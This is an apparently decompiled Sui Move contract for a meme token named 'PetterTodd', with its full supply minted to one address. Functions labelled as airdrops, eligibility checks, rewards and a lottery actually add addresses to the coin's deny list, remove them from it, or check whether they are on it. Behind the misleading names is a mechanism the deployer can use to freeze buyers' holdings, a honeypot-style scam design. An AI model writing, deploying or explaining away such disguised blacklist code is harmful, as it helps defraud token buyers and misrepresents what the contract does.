module 0x693ad6b3f664b1f983431aa3cce14a324ab803c963360ad08e761d913b747f96::petter_todd {
    struct PETTER_TODD has drop {
        dummy_field: bool,
    }

    public fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PETTER_TODD>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_add<PETTER_TODD>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    public fun calculate_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64, u8) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 1000000000000000000, 9)
    }

    public fun check_eligibility<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : bool {
        0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1)
    }

    public fun claim_reward<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    fun init(arg0: PETTER_TODD, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PETTER_TODD>(arg0, 9, b"PetterTodd", b"Satoshi Nakamoto", b"Satoshi Nakamoto's Secret ID. HBO", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://orange-upper-booby-780.mypinata.cloud/ipfs/Qmb3TwzeTtdJnrRoy2cfYwEBJ7Tf1gdBYbGRiKN6PA9cqn"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PETTER_TODD>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PETTER_TODD>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<PETTER_TODD>(&mut v3, 1000000000000000000, @0x97e5262a475cf19df49da43a13a4ed54913283233a13b429341595cb2b880ade, arg1);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PETTER_TODD>>(v3);
    }

    public fun lottery_pixel<T0>(arg0: &0x2::deny_list::DenyList, arg1: address) : (bool, u64) {
        (0x2::coin::deny_list_v2_contains_next_epoch<T0>(arg0, arg1), 999000000000)
    }

    public fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PETTER_TODD>, arg2: vector<address>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0;
        loop {
            0x2::coin::deny_list_v2_remove<PETTER_TODD>(arg0, arg1, *0x1::vector::borrow<address>(&arg2, v0), arg3);
            v0 = v0 + 1;
            if (v0 >= 0x1::vector::length<address>(&arg2)) {
                break
            };
        };
    }

    // decompiled from Move bytecode v6
}

